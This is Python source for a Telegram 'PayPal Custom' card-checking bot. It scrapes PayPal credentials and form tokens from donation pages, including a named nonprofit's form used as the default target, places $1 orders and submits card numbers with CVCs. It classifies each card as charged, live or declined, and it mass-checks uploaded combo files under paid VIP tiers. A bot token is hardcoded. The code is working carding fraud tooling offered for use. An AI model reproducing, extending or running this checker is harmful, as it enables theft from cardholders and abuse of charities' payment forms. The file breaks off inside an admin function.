import os
import re
import time
import random
import string
import asyncio
import httpx
import requests
from urllib.parse import urlparse
from fake_useragent import UserAgent
from requests_toolbelt import MultipartEncoder
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters, ContextTypes
)

TOKEN = '8031233073:AAGgdXbO9TCxPYdPiedLlT9zGVxIMQFiML4'

# ------------------- System Configurations -------------------

ADMINS = [6843321125]  
VIP_USERS = {}         
BANNED_USERS = {}      
ALL_USERS = set()      
GATEWAYS = []          
stop_users = {}
last_check_time = {}
ANTI_SPAM_SECONDS = 7
user_tasks = {}
CODES = {}

gateway_index = 0

# ------------------- Premium Emoji Configuration -------------------

PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088",
    "🔥": "5999340396432333728",
    "❌": "6037570896766438989",
    "⚡": "6026367225466720832",
    "💳": "5971944878815317190",
    "💠": "5971837723676249096",
    "📝": "6023660820544623088",
    "🌐": "6026367225466720832",
    "🎯": "5974235702701853774",
    "🤖": "6057466460886799210",
    "🤵": "4949560993840629085",
    "💰": "5971944878815317190",
    "⏸️": "6001440193058444284",
    "▶️": "6285315214673975495",
    "🛑": "5420323339723881652",
    "📊": "5971837723676249096",
    "📦": "6066395745139824604",
    "📋": "5974235702701853774",
    "🔄": "5971837723676249096",
    "⏳": "5971837723676249096",
    "🚀": "6282977077427702833",
    "⚠️": "5420323339723881652",
    "💎": "6023660820544623088",
}

def premium_emoji(text):
    if not text:
        return text
    result = text
    sorted_emojis = sorted(PREMIUM_EMOJI_IDS.keys(), key=len, reverse=True)
    for emoji in sorted_emojis:
        doc_id = PREMIUM_EMOJI_IDS[emoji]
        result = result.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# ------------------- Async Semaphores -------------------

api_semaphore = asyncio.Semaphore(6)

# ------------------- BIN Lookup Processor -------------------

async def get_bin_info(bin_number):
    urls = [
        f"https://bins.antipublic.cc/bins/{bin_number}",
        f"https://lookup.binlist.net/{bin_number}",
    ]
    for url in urls:
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                r = await client.get(url)
            if r.status_code != 200:
                continue
            data = r.json()
            brand = data.get("scheme") or data.get("brand") or data.get("type")
            card_type = data.get("type") or data.get("card_type")
            bank = data.get("bank", {}).get("name") if isinstance(data.get("bank"), dict) else data.get("bank")
            country = data.get("country", {}).get("name") if isinstance(data.get("country"), dict) else data.get("country")
            if not bank:
                bank = data.get("issuer") or data.get("bank_name")
            if not country:
                country = data.get("country_name")
            if brand or bank or country:
                return (f"{brand or 'Unknown'} - {card_type or 'Unknown'}", bank or "Unknown", country or "Unknown")
        except:
            continue
        await asyncio.sleep(0.5)
    return "Unknown", "Unknown", "Unknown"

# ------------------- PayPal Commerce Class - Final Universal -------------------

class PayPalCommerce:
    def __init__(self, target_url=None):
        self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        self.donation = "1.00"
        self.r = requests.Session()
        self.uu = UserAgent()
        self.checked = 0
        
        self.client_id = None
        self.access_token = None
        self.client_token = None
        self.form_data = {}
        self.ajax_url = None
        self.payment_method = None
        
        self.target_url = target_url if target_url else 'https://www.sandiegoyokohamasistercity.org/donations/donation-form/'
        self.url = urlparse(self.target_url).netloc
        self.inurl = urlparse(self.target_url).path
        if urlparse(self.target_url).query:
            self.inurl += f"?{urlparse(self.target_url).query}"
        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
        
        self._init_and_extract()
        self._get_access_token()
        self._get_client_token()

    def _init_and_extract(self):
        try:
            headers = {
                'user-agent': self.uu.random,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
            }
            
            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
            html = response.text
            
            self._extract_client_id(html)
            self._extract_form_data(html)
            self._detect_gateway_type(html)
            self._extract_ajax_url(html)
            
        except:
            pass

    def _extract_client_id(self, html):
        patterns = [
            r'client-id="([^"]+)"',
            r'client_id["\']?\s*[:=]\s*["\']([^"\']+)',
            r'data-client-id="([^"]+)"',
            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})',
            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)',
            r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                self.client_id = match.group(1)
                return
        
        script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
        for script in script_matches:
            for pattern in patterns:
                match = re.search(pattern, script, re.IGNORECASE)
                if match:
                    self.client_id = match.group(1)
                    return
        
        long_strings = re.findall(r'["\']([A-Za-z0-9_-]{80,})["\']', html)
        for string in long_strings:
            if string.startswith(('A', 'B', 'E')):
                self.client_id = string
                return
        
        src_matches = re.findall(r'<script[^>]*src="([^"]+)"[^>]*>', html)
        for src in src_matches:
            if 'paypal' in src.lower():
                client_id_match = re.search(r'client-id=([^&"\']+)', src)
                if client_id_match:
                    self.client_id = client_id_match.group(1)
                    return

    def _extract_form_data(self, html):
        inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
        for name, value in inputs:
            self.form_data[name] = value
        
        data_attrs = re.findall(r'data-([\w-]+)="([^"]+)"', html)
        for attr_name, attr_value in data_attrs:
            if any(k in attr_name.lower() for k in ['give', 'paypal', 'form', 'client', 'merchant', 'nonce', 'hash']):
                self.form_data[attr_name] = attr_value

    def _detect_gateway_type(self, html):
        html_lower = html.lower()
        if 'give-form' in html or 'give_paypal_commerce' in html or 'givewp' in html_lower:
            self.payment_method = "givewp"
        elif 'woocommerce' in html_lower or 'wc-ajax' in html_lower:
            self.payment_method = "woocommerce"
        elif 'paypal' in html_lower:
            self.payment_method = "generic"
        else:
            self.payment_method = "unknown"

    def _extract_ajax_url(self, html):
        if 'admin-ajax.php' in html:
            self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        elif 'wc-ajax' in html:
            self.ajax_url = f'https://{self.url}/?wc-ajax=checkout'

    def _get_access_token(self):
        if not self.client_id:
            return None
        
        try:
            headers = {
                'user-agent': self.uu.random,
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
            }
            
            data = {'grant_type': 'client_credentials'}
            
            response = self.r.post(
                'https://api-m.paypal.com/v1/oauth2/token',
                headers=headers,
                data=data,
                auth=(self.client_id, ''),
                timeout=15
            )
            
            if response.status_code == 200:
                self.access_token = response.json().get('access_token')
                return self.access_token
            
        except:
            pass
        
        return None

    def _get_client_token(self):
        if not self.ajax_url:
            return None
        
        try:
            actions = [
                'give_paypal_commerce_get_client_token',
                'get_client_token',
                'paypal_get_client_token',
            ]
            
            for action in actions:
                data = {
                    'action': action,
                    'form-id': self.form_data.get('give-form-id', ''),
                }
                
                headers = {
                    'user-agent': self.uu.random,
                    'x-requested-with': 'XMLHttpRequest',
                    'origin': f'https://{self.url}',
                    'referer': f'https://{self.url}{self.inurl}',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                }
                
                response = self.r.post(self.ajax_url, data=data, headers=headers, timeout=10)
                
                if response.status_code == 200 and response.text:
                    json_data = response.json()
                    if 'data' in json_data:
                        if isinstance(json_data['data'], dict):
                            self.client_token = json_data['data'].get('client_token') or json_data['data'].get('token')
                        elif isinstance(json_data['data'], str):
                            self.client_token = json_data['data']
                        
                        if self.client_token:
                            return self.client_token
            
            return None
        except:
            return None

    def _create_order(self):
        if self.ajax_url:
            order_id = self._create_order_givewp()
            if order_id:
                return order_id
        
        if self.access_token:
            order_id = self._create_order_direct()
            if order_id:
                return order_id
        
        return None

    def _create_order_givewp(self):
        if not self.ajax_url:
            return None
        
        form_data = self.form_data.copy()
        form_data.update({
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
        })
        
        headers = {
            'user-agent': self.uu.random,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{self.url}',
            'referer': f'https://{self.url}{self.inurl}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        
        actions = [
            'give_paypal_commerce_create_order',
            'give_create_order',
            'create_order',
        ]
        
        for action in actions:
            params = {'action': action}
            
            try:
                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, timeout=15)
                
                if response.status_code == 200 and response.text:
                    json_data = response.json()
                    
                    if 'data' in json_data:
                        if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
                            return json_data['data']['id']
                        elif isinstance(json_data['data'], str):
                            return json_data['data']
                    
                    if 'id' in json_data:
                        return json_data['id']
                    
                    if 'order_id' in json_data:
                        return json_data['order_id']
                    
                    if 'orderID' in json_data:
                        return json_data['orderID']
            
            except:
                continue
        
        return None

    def _create_order_direct(self):
        if not self.access_token:
            return None
        
        try:
            headers = {
                'authorization': f'Bearer {self.access_token}',
                'content-type': 'application/json',
                'user-agent': self.uu.random,
                'accept': 'application/json',
            }
            
            data = {
                'intent': 'CAPTURE',
                'purchase_units': [{
                    'amount': {
                        'currency_code': 'USD',
                        'value': self.donation
                    }
                }],
                'application_context': {
                    'shipping_preference': 'NO_SHIPPING',
                    'user_action': 'PAY_NOW',
                }
            }
            
            response = self.r.post(
                'https://api-m.paypal.com/v2/checkout/orders',
                headers=headers,
                json=data,
                timeout=15
            )
            
            if response.status_code in [200, 201]:
                response_data = response.json()
                if 'id' in response_data:
                    return response_data['id']
            
            return None
        except:
            return None

    def _confirm_payment(self, order_id, card_number, expiry, cvc):
        auth_tokens = []
        if self.client_token:
            auth_tokens.append(self.client_token)
        if self.access_token:
            auth_tokens.append(self.access_token)
        if self.client_id:
            auth_tokens.append(self.client_id)
        
        for auth_token in auth_tokens:
            he4 = {
                'authorization': f'Bearer {auth_token}',
                'paypal-client-metadata-id': self.client_id or '',
                'user-agent': self.uu.random,
                'content-type': 'application/json',
                'accept': 'application/json',
            }
            
            da3 = {
                'payment_source': {
                    'card': {
                        'number': card_number,
                        'expiry': expiry,
                        'security_code': cvc,
                        'name': f"{random.choice(self.first_name)} {random.choice(self.last_name)}",
                        'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                    },
                },
                'application_context': {'vault': False},
            }
            
            try:
                response = self.r.post(
                    f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                    headers=he4,
                    json=da3,
                    timeout=15
                )
                
                if response.status_code == 200:
                    try:
                        return response, response.json()
                    except:
                        return response, {}
                
            except:
                continue
            
            try:
                response = self.r.post(
                    f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                    headers=he4,
                    json=da3,
                    timeout=15
                )
                
                if response.status_code == 200:
                    try:
                        return response, response.json()
                    except:
                        return response, {}
                
            except:
                continue
        
        return None, {}

    def _approve_order(self, order_id):
        if not self.ajax_url:
            return None
        
        form_data = self.form_data.copy()
        form_data.update({
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
        })
        
        headers = {
            'user-agent': self.uu.random,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{self.url}',
            'referer': f'https://{self.url}{self.inurl}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        
        actions = [
            'give_paypal_commerce_approve_order',
            'give_approve_order',
            'approve_order',
            'give_process_donation',
        ]
        
        for action in actions:
            params = {
                'action': action,
                'order': order_id,
            }
            
            try:
                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, timeout=15)
                
                if response.status_code == 200:
                    return response
            except:
                continue
        
        return None

    def Charge(self, ccx):
        """فحص البطاقة - CHARGE حقيقي فقط"""
        self.checked += 1
        ccx = ccx.strip()
        
        try:
            parts = ccx.split("|")
            if len(parts) < 4:
                return "Invalid card format"
            
            n = parts[0].strip()
            mm = parts[1].strip()
            yy = parts[2].strip()
            cvc = parts[3].strip()
            
            if "20" in yy:
                yy = yy.split("20")[1]
            
            expiry = f"20{yy}-{mm}"
            
            # 1. Order
            order_id = self._create_order()
            if not order_id:
                return "Create Order Failed"
            
            # 2. Confirm
            confirm_res, confirm_json = self._confirm_payment(order_id, n, expiry, cvc)
            
            # 3. Approve - الموقع يرجع الرد
            approve_res = self._approve_order(order_id)
            
            text = approve_res.text if approve_res else ''
            text_lower = text.lower()
            
            # ============ التصنيف النهائي ============
            
            # CHARGE حقيقي - الموقع قال true فقط
            if text_lower.strip() == 'true':
                return 'CHARGE 1.0'
            
            if '"success":true' in text_lower.replace(' ', ''):
                return 'CHARGE 1.0'
            
            # LIVE - INSUFFICIENT_FUNDS
            if 'INSUFFICIENT_FUNDS' in text or 'INSUFFICIENT_FUNDS' in str(confirm_json):
                return "INSUFFICIENT_FUNDS"
            
            # أي خطأ - نرجع من الموقع
            if approve_res:
                try:
                    error = approve_res.json()['data']['error']
                    if error:
                        return error
                except:
                    pass
            
            if isinstance(confirm_json, dict) and 'name' in confirm_json:
                return confirm_json['name']
            
            if isinstance(confirm_json, dict) and 'details' in confirm_json and len(confirm_json['details']) > 0:
                return confirm_json['details'][0].get('issue', 'UNKNOWN')
            
            return text[:200] if text else "UNKNOWN_ERROR"
        
        except Exception as e:
            return f"Error: {e}"

# ------------------- Core API Engine -------------------

async def check_card_api(card_full, gateway_url):
    async with api_semaphore:
        try:
            loop = asyncio.get_event_loop()
            
            def run_check():
                pp_engine = PayPalCommerce(target_url=gateway_url if gateway_url else None)
                return pp_engine.Charge(card_full)

            result_raw = await loop.run_in_executor(None, run_check)
            result = str(result_raw).lower()

            if "charge" in result:
                return "approved", result_raw
            elif "insufficient" in result:
                return "live", result_raw
            else:
                return "declined", result_raw if result_raw else "Declined"
        except Exception as e:
            return "declined", f"Error: {e}"

# ------------------- Card Format Generator -------------------

async def format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, mode="Single"):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)

    if status == "approved":
        status_text = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 / 𝐂𝐡𝐚𝐫𝐠𝐞 🔥💎"
    elif status == "live":
        status_text = "𝐋𝐢𝐯𝐞 / 𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐅𝐮𝐧𝐝𝐬 ✅✨"
    else:
        status_text = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 / 𝐄𝐫𝐫𝐨𝐫 ❌"
        
    if user_id in ADMINS:
        user_status = "𝐀𝐝𝐦𝐢𝐧 👑"
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        user_status = "𝐏𝐫𝐞𝐦𝐢𝐮𝐦 💎"
    else:
        user_status = "𝐅𝐫𝐞𝐞 𝐔𝐬𝐞𝐫 🤖"

    gateway_info = ""
    if user_id in ADMINS and gateway_url:
        gateway_info = f"\n[🔗] 𝐆𝐚𝐭𝐞 #{gateway_num}: <code>{gateway_url}</code>"

    text = f"""#𝐏𝐚𝐲𝐏𝐚𝐥 𝐂𝐮𝐬𝐭𝐨𝐦 [{mode}] 🌟
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>
[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
[ϟ] 𝐓𝐚𝐤𝐞𝐧: <code>{taken}s</code>
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝐈𝐧𝐟𝐨: <code>{info}</code>
[ϟ] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country}</code>
[⎇] 𝐑𝐞𝐪 𝐁𝐲: <code>{user_id}</code> ({user_status}){gateway_info}
- - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝐃𝐞𝐯 𝐛𝐲: 𝐖𝐚𝐟𝐚 🍀"""
    return premium_emoji(text)

# ------------------- Guard Systems -------------------

async def check_banned_guard(update: Update) -> bool:
    user_id = update.effective_user.id
    if BANNED_USERS.get(user_id):
        text = "⚠️ 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝: Account restricted from using this service."
        await update.message.reply_text(premium_emoji(text), parse_mode="HTML")
        return True
    return False

def can_user_check(user_id, mode="file"):
    if user_id in ADMINS: return True
    if BANNED_USERS.get(user_id): return False
    if user_id in VIP_USERS and VIP_USERS[user_id] > time.time(): return True
    return mode == "single"

# ------------------- Command /cmds -------------------

async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_banned_guard(update): return
    commands_text = """┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
         ▬▬▬ [ 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 ] ▬▬▬
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
🤵 𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:
• <code>/add [url]</code> - Add processing gateway
• <code>/rmadd</code> - Remove last gateway
• <code>/show_gateways</code> - Show all gateways
• <code>/ban_user [id]</code> - Ban user
• <code>/unban_user [id]</code> - Unban user
• <code>/prm [id] [days]</code> - Add VIP
• <code>/rmprm [id]</code> - Remove VIP
• <code>/wafa [days] [max]</code> - Generate keys
• <code>/show_users</code> - Show all users
• <code>/try [id] [msg]</code> - DM user
• <code>/SENT [msg]</code> - Broadcast to all

💎 𝐕𝐈𝐏 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:
• Upload combo file - Mass checking

🤖 𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:
• <code>/start</code> - Start bot
• <code>/cmds</code> - Show commands
• <code>/pp [card]</code> - Single check
• <code>/stop</code> - Stop mass check
• <code>/code [key]</code> - Activate VIP
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    await update.message.reply_text(premium_emoji(commands_text), parse_mode="HTML")

# ------------------- Single Card Gate -------------------

async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_banned_guard(update): return
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not can_user_check(user_id, "single"):
        text = "❌ 𝐎𝐩𝐞𝐫𝐚𝐭𝐢𝐨𝐧𝐚𝐥 𝐄𝐫𝐫𝐨𝐫: Premium VIP permissions missing."
        await update.message.reply_text(premium_emoji(text), parse_mode="HTML")
        return
    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
        now = time.time()
        last = last_check_time.get(user_id, 0)
        if now - last < ANTI_SPAM_SECONDS:
            text = f"⏳ 𝐃𝐲𝐧𝐚𝐦𝐢𝐜 𝐭𝐡𝐫𝐨𝐭𝐭𝐥𝐢𝐧𝐠 𝐚𝐜𝐭𝐢𝐯𝐞: Wait {ANTI_SPAM_SECONDS} seconds."
            await update.message.reply_text(premium_emoji(text), parse_mode="HTML")
            return
        last_check_time[user_id] = now
    try:
        asyncio.create_task(process_pp(update, context))
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global gateway_index
    user_id = update.effective_user.id
    card_full = " ".join(context.args)
    if not card_full:
        text = "💡 𝐔𝐬𝐚𝐠𝐞:\n<code>/pp 4242424242424242|09|28|123</code>"
        await update.message.reply_text(premium_emoji(text), parse_mode="HTML")
        return
    
    gateway_num = 0
    gateway_url = None
    if GATEWAYS:
        gateway_num = (gateway_index % len(GATEWAYS)) + 1
        gateway_url = GATEWAYS[gateway_index % len(GATEWAYS)]
        gateway_index += 1
    
    start_time = time.time()
    status, response = await check_card_api(card_full, gateway_url)
    taken = round(time.time() - start_time, 2)
    
    text = await format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, mode="Single")
    await update.message.reply_text(text, parse_mode="HTML")

# ------------------- Emergency Interrupt -------------------

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_banned_guard(update): return
    user_id = update.effective_user.id
    stop_users[user_id] = True
    text = "🛑 𝐓𝐡𝐞 𝐞𝐱𝐚𝐦𝐢𝐧𝐚𝐭𝐢𝐨𝐧 𝐰𝐚𝐬 𝐬𝐭𝐨𝐩𝐩𝐞𝐝."
    await update.message.reply_text(premium_emoji(text), parse_mode="HTML")

# ------------------- Mass File Intermediary -------------------

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_banned_guard(update): return
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not can_user_check(user_id, "file"):
        text = "❌ 𝐄𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧 𝐑𝐞𝐟𝐮𝐬𝐞𝐝: File arrays require a Premium subscription tier."
        await update.message.reply_text(premium_emoji(text), parse_mode="HTML")
        return
    if user_id not in ADMINS:
        if user_id in user_tasks and not user_tasks[user_id].done():
            text = "❌ 𝐁𝐮𝐬𝐲 𝐬𝐭𝐚𝐭𝐞 𝐝𝐞𝐭𝐞𝐜𝐭𝐞𝐝: Your current queue has not cleared."
            await update.message.reply_text(premium_emoji(text), parse_mode="HTML")
            return
    try:
        task = asyncio.create_task(process_file(update, context))
        user_tasks[user_id] = task
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

# ------------------- The Mass Panel Processing Loop -------------------

async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global gateway_index
    user_id = update.effective_user.id
    stop_users[user_id] = False
    try:
        os.makedirs("downloads", exist_ok=True)
        file = await update.message.document.get_file()
        file_path = f"downloads/{file.file_id}.txt"
        await file.download_to_drive(file_path)

        approved = live = declined = 0
        card_counter = 0
        panel_msg = await update.message.reply_text(premium_emoji("𝐒𝐭𝐚𝐫𝐭 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠... 🎯"), parse_mode="HTML")
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        total_gateways = len(GATEWAYS)
        
        for line in lines:
            if stop_users.get(user_id):
                text = "🛑 𝐓𝐡𝐞 𝐞𝐱𝐚𝐦𝐢𝐧𝐚𝐭𝐢𝐨𝐧 𝐰𝐚𝐬 𝐬𝐭𝐨𝐩𝐩𝐞𝐝."
                await update.message.reply_text(premium_emoji(text), parse_mode="HTML")
                return
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if not match: continue
            card_full = match[0]
            card_counter += 1
            
            gateway_num = 0
            gateway_url = None
            if GATEWAYS:
                gateway_num = ((card_counter - 1) % len(GATEWAYS)) + 1
                gateway_url = GATEWAYS[(card_counter - 1) % len(GATEWAYS)]
            
            start_time = time.time()
            status, response = await check_card_api(card_full, gateway_url)
            await asyncio.sleep(random.uniform(0, 2))
            taken = round(time.time() - start_time, 2)
            
            if status == "approved":
                approved += 1
                text = await format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, mode="Mass")
                await update.message.reply_text(text, parse_mode="HTML")
            elif status == "live":
                live += 1
                text = await format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, mode="Mass")
                await update.message.reply_text(text, parse_mode="HTML")
            else:
                declined += 1
                
            last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6])
            
            gate_info = ""
            if user_id in ADMINS:
                if total_gateways > 0:
                    gate_info = f"\n🔗 𝐆𝐚𝐭𝐞 #{gateway_num} / {total_gateways}"
            
            panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
         ▬▬ [ 𝐌𝐀𝐒𝐒 𝐏𝐀𝐘𝐏𝐀𝐋 ] ▬▬
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
✅ 𝐂𝐡𝐚𝐫𝐠𝐞: <code>{approved}</code> 💎
✅ 𝐋𝐢𝐯𝐞: <code>{live}</code> ⚡
❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: <code>{declined}</code>
📊 𝐓𝐨𝐭𝐚𝐥: <code>{approved + live + declined}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💳 𝐂𝐚𝐫𝐝 #{card_counter}: <code>{card_full}</code>
📝 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>{gate_info}
💠 𝐈𝐧𝐟𝐨: <code>{last_info}</code>
🤵 𝐁𝐚𝐧𝐤: <code>{last_bank}</code>
🌐 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{last_country}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🛑 𝐒𝐭𝐨𝐩: <code>{'ON' if stop_users.get(user_id) else 'OFF'}</code>"""
            try:
                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
            except: pass

        text = "🚀 𝐒𝐮𝐜𝐜𝐞𝐬𝐬: Mass transaction loops executed completely."
        await update.message.reply_text(premium_emoji(text), parse_mode="HTML")
    except Exception as e:
        text = f"❌ 𝐒𝐭𝐫𝐮𝐜𝐭𝐮𝐫𝐚𝐥 𝐅𝐚𝐮𝐥𝐭: {e}"
        await update.message.reply_text(premium_emoji(text), parse_mode="HTML")

# ------------------- Administration Subsystem -------------------

async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    try:
        user_id = int(context.args[0])
        reply_text = " ".join(context.args[1:])
        await context.bot.send_message(chat_id=user_id, text=premium_emoji(reply_text), parse_mode="HTML")
        await update.message.reply_text(premium_emoji("✅ 𝐃𝐲𝐧𝐚𝐦𝐢𝐜 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐫𝐨𝐮𝐭𝐞𝐝."), parse_mode="HTML")
    except: pass

async def sent_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    broadcast_msg = " ".join(context.args)
    count = 0
    for user_id in list(ALL_USERS):
        try:
            await context.bot.send_message(chat_id=user_id, text=premium_emoji(f"📢 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐍𝐍𝐎𝐔𝐍𝐂𝐄𝐌𝐄𝐍𝐓:\n\n{broadcast_msg}"), parse_mode="HTML")
            count += 1
            await asyncio.sleep(0.05)
        except: continue
    await update.message.reply_text(premium_emoji(f"✅ 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞: {count} users."), parse_mode="HTML")

async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not context.args: return
    code = context.args[0].upper()
    if code not in CODES:
        return await update.message.reply_text(premium_emoji("❌ 𝐓𝐨𝐤𝐞𝐧 𝐬𝐢𝐠𝐧𝐚𝐭𝐮𝐫𝐞 𝐢𝐧𝐯𝐚𝐥𝐢𝐝."), parse_mode="HTML")
    code_data = CODES[code]
    if code_data["used"] >= code_data["max_users"]:
        return await update.message.reply_text(premium_emoji("❌ 𝐌𝐚𝐱 𝐚𝐥𝐥𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐜𝐚𝐩 𝐡𝐢𝐭."), parse_mode="HTML")
    VIP_USERS[user_id] = int(time.time()) + code_data["duration"] * 86400
    code_data["used"] += 1
    await update.message.reply_text(premium_emoji(f"🚀 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧𝐬 𝐂𝐨𝐧𝐟𝐢𝐠𝐮𝐫𝐞𝐝! {code_data['duration']} days."), parse_mode="HTML")

async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    try:
        duration, max_users = int(context.args[0]), int(context.args[1])
        code = "WAFA-" + "-".join("".join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))
        CODES[code] = {"duration": duration, "max_users": max_users, "used": 0, "created": time.time()}
        await update.message.reply_text(premium_emoji(f"💰 𝐂𝐨𝐝𝐞 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝:\n<code>{code}</code>"), parse_mode="HTML")
    except: pass

async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    msg = "📊 𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞 𝐔𝐬𝐞𝐫𝐬 𝐌𝐚𝐭𝐫𝐢𝐱:\n\n"
    for uid in ALL_USERS:
        status = "BANNED" if uid in BANNED_USERS else "VIP" if uid in VIP_USERS else "NORMAL"
        msg += f"• <code>{uid}</code> - <b>{status}</b>\n"
    await update.message.reply_text(premium_emoji(msg), parse_mode="HTML")

async def show_gateways(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    if not GATEWAYS:
        await update.message.reply_text(premium_emoji("❌ 𝐍𝐨 𝐠𝐚𝐭𝐞𝐰𝐚𝐲𝐬 𝐚𝐝𝐝𝐞𝐝."), parse_mode="HTML")
        return
